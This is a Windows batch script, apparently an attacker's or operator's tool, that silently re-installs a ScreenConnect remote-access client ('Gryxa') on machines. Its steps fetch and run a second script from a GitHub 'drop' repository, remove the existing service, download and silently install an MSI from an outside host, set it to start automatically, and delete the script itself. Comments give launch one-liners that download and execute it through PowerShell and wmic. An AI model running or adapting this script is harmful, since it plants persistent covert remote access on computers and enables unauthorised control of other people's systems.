@echo off
rem WINRTCS_GRYXA_FORCE G1 - one-shot: arm WinRTCS Quick + clean-reinstall Gryxa (36e506ff).
rem For hosts missing from the Gryxa console. Keepers (sevrz) are NEVER touched.
rem Self-detaches first (ScreenConnect Guest kills the tree at ~10s).
rem Downloads: real curl.exe if present (>1KB), else PowerShell WebClient (handles
rem hollowed 0-byte curl.exe stubs). MSI: ui.gryxa.com primary, repo pkg fallback.
rem Log: C:\Users\Public\gryxa_force.log
rem
rem Launch (Guest-safe - pick one):
rem   start "" /min cmd.exe /c "powershell -NoP -C \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_force.cmd','C:\Users\Public\gf.cmd')\" & C:\Users\Public\gf.cmd"
rem   wmic process call create "cmd.exe /c C:\Users\Public\gf.cmd"
rem (download gf.cmd first if needed via the powershell one-liner above)
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\gryxa_force_run.cmd" >nul 2>&1
  if not exist "C:\Users\Public\gryxa_force_run.cmd" copy /y "%~f0" "%SystemRoot%\Temp\gryxa_force_run.cmd" >nul 2>&1
  if exist "C:\Users\Public\gryxa_force_run.cmd" (
    start "" /min cmd.exe /c "C:\Users\Public\gryxa_force_run.cmd --detached"
  ) else (
    start "" /min cmd.exe /c "%SystemRoot%\Temp\gryxa_force_run.cmd --detached"
  )
  echo QUEUED gryxa-force detached - log C:\Users\Public\gryxa_force.log
  exit /b 0
)
setlocal EnableExtensions EnableDelayedExpansion
set "PUB=C:\Users\Public"
set "ZD=C:\ProgramData\WinRTCS"
set "LOG=%PUB%\gryxa_force.log"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "GFP=36e506ff016b2151"
set "GSVC=ScreenConnect Client (%GFP%)"
>"%LOG%" echo [%DATE% %TIME%] force_begin host=%COMPUTERNAME%

rem --- 1) arm WinRTCS Quick ---
echo [%DATE% %TIME%] step_quick>>"%LOG%"
call :Fetch "%BASE%/winrtcs_quick.cmd" "%PUB%\wq.cmd"
if not exist "%PUB%\wq.cmd" (
  echo [%DATE% %TIME%] FAIL quick_download>>"%LOG%"
  goto :DoGryxa
)
findstr /C:"WINRTCS_QUICK" "%PUB%\wq.cmd" >nul 2>&1
if errorlevel 1 (
  echo [%DATE% %TIME%] FAIL quick_bad>>"%LOG%"
  goto :DoGryxa
)
call "%PUB%\wq.cmd" >>"%LOG%" 2>&1
echo [%DATE% %TIME%] quick_done>>"%LOG%"

:DoGryxa
rem --- 2) stop/delete current Gryxa FP only (keepers untouched) ---
echo [%DATE% %TIME%] step_uninstall %GFP%>>"%LOG%"
sc stop "%GSVC%" >nul 2>&1
sc delete "%GSVC%" >nul 2>&1

rem --- 3) msiexec /x shared ProductCode (detached wait via ping) ---
echo [%DATE% %TIME%] step_msiexec_x>>"%LOG%"
start "" /min msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress
ping -n 16 127.0.0.1 >nul 2>&1

rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GFP%)" >nul 2>&1
rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GFP%)" >nul 2>&1

rem --- 4) fetch Gryxa MSI (UI primary, repo fallback) ---
echo [%DATE% %TIME%] step_fetch_msi>>"%LOG%"
del /f /q "%PUB%\gryxa.msi" >nul 2>&1
call :Fetch "%UI%" "%PUB%\gryxa.msi"
set "OKMSI="
if exist "%PUB%\gryxa.msi" for %%F in ("%PUB%\gryxa.msi") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] ui_msi_fail_try_repo>>"%LOG%"
  del /f /q "%PUB%\gryxa.msi" >nul 2>&1
  call :Fetch "%BASE%/pkg_gryxa.msi" "%PUB%\gryxa.msi"
)
set "OKMSI="
if exist "%PUB%\gryxa.msi" for %%F in ("%PUB%\gryxa.msi") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] FAIL no_msi>>"%LOG%"
  echo GRYXA_FORCE=FAIL_NO_MSI
  endlocal & exit /b 3
)
for %%F in ("%PUB%\gryxa.msi") do echo [%DATE% %TIME%] msi_ok size=%%~zF>>"%LOG%"

rem --- 5) install + start ---
echo [%DATE% %TIME%] step_msiexec_i>>"%LOG%"
start "" /min msiexec /i "%PUB%\gryxa.msi" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
ping -n 91 127.0.0.1 >nul 2>&1

sc config "%GSVC%" start= auto >nul 2>&1
sc start "%GSVC%" >nul 2>&1
ping -n 11 127.0.0.1 >nul 2>&1

sc query "%GSVC%" 2>nul | findstr /C:"RUNNING" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] FAIL svc_not_running>>"%LOG%"
  sc query "%GSVC%" >>"%LOG%" 2>&1
  echo GRYXA_FORCE=FAIL_SVC
  endlocal & exit /b 4
)
echo [%DATE% %TIME%] OK running %GSVC%>>"%LOG%"
echo GRYXA_FORCE=OK
del /f /q "%PUB%\gryxa_force_run.cmd" "%SystemRoot%\Temp\gryxa_force_run.cmd" >nul 2>&1
endlocal & exit /b 0

:Fetch
rem %1 = URL, %2 = destination. Prefer a real curl (>1KB binary); else PowerShell WebClient.
del /f /q "%~2" >nul 2>&1
set "USECURL="
if exist "%CURL%" for %%C in ("%CURL%") do if %%~zC GTR 1000 set "USECURL=1"
if defined USECURL (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 300 -o "%~2" "%~1" >>"%LOG%" 2>&1
) else (
  echo [%DATE% %TIME%] fetch_ps %~1>>"%LOG%"
  "%PS%" -NoProfile -NonInteractive -Command "& { $ErrorActionPreference='Stop'; (New-Object Net.WebClient).DownloadFile('%~1','%~2') }" >>"%LOG%" 2>&1
)
if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
exit /b 1
